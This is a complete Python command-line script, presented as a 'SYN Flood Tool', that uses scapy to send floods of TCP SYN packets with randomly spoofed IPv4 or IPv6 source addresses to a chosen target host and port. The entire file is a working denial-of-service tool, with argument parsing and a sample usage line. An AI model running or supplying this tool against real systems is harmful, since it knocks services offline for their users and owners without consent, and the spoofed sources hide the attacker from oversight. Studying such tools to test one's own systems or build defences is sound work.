#!/usr/bin/env python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool CMD v2.0.1

from sys import stdout
from scapy.all import IP, IPv6, TCP, RandIP6, send
from random import randint
from argparse import ArgumentParser


def random_ip() -> str:
    return ".".join(map(str, (randint(0, 255) for _ in range(4))))

def rand_int() -> int:
    return randint(1000, 9000)

def syn_flood(dst_ip: str, dst_port: int, counter: int):
    total = 0
    print("IPv4 Packets are sending ...")

    for _ in range(counter):
        ip_packet = IP(src=random_ip(), dst=dst_ip)
        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
        send(ip_packet/tcp_packet, verbose=0)
        total += 1

    stdout.write(f"\nTotal packets sent: {total}\n")

def syn_flood_v6(dst_ip: str, dst_port: int, counter: int):
    total = 0
    print("IPv6 Packets are sending ...")

    for _ in range(counter):
        ip_packet = IPv6(src=RandIP6(), dst=dst_ip)
        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
        send(ip_packet/tcp_packet, verbose=0)
        total += 1

    stdout.write(f"\nTotal packets sent: {total}\n")

def main():
    parser = ArgumentParser(description="Python3 SYN Flood Tool CMD v2.0.1")
    parser.add_argument('--target', '-t', help='Target IP address', required=True)
    parser.add_argument('--port', '-p', type=int, help='Target port number', required=True)
    parser.add_argument('--count', '-c', type=int, help='Number of packets', default=1)
    parser.add_argument('--format', '-f', type=int, choices=[4, 6], help='Format of target IP (4 for IPv4, 6 for IPv6)', default=4)
    parser.add_argument('--version', '-v', action='version', version='Python SYN Flood Tool v2.0.1\n@EmreOvunc')
    parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1 -f 6"

    args = parser.parse_args()

    if args.format == 6:
        syn_flood_v6(args.target, args.port, args.count)
    else:
        syn_flood(args.target, args.port, args.count)

if __name__ == "__main__":
    main()
